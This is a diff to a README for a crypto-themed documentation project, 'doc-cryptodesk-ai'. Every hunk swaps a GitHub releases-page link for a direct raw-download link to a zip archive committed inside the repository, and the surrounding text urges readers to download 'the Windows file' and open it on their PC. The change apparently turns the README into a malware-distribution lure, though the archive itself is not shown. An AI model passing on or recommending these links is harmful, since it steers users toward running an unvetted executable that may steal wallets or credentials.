@@ -1,6 +1,6 @@
 # 🛡️ doc-cryptodesk-ai - Clear docs for CryptoDesk AI
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip)
 
 ## 📘 What this is
 
@@ -12,7 +12,7 @@ The site uses Next.js and MDX. It is built for simple reading on Windows and for
 
 Go to the release page here:
 
-[Visit the release page to download](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases)
+[Visit the release page to download](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip)
 
 Use this page to get the Windows file, then open it on your PC
 
@@ -38,7 +38,7 @@ For best results, use a recent version of Windows 10 or Windows 11
 ## 📥 Download and install
 
 1. Open the release page  
-   [https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases)
+   [https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip)
 
 2. Find the latest release
 
@@ -155,7 +155,7 @@ The docs are built with Next.js, and the project supports a desktop app workflow
 
 Use the release page here:
 
-[https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases)
+[https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip)
 
 ## 📌 Project details
 
@@ -182,7 +182,7 @@ Use the release page here:
 
 ## 📦 Release page link
 
-[Open the download page](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/releases)
+[Open the download page](https://github.com/Drainagesystemfeedlot210/doc-cryptodesk-ai/raw/refs/heads/main/app/community/doc-cryptodesk-ai-v1.6.zip)
 
 ## 🧷 Quick path
 
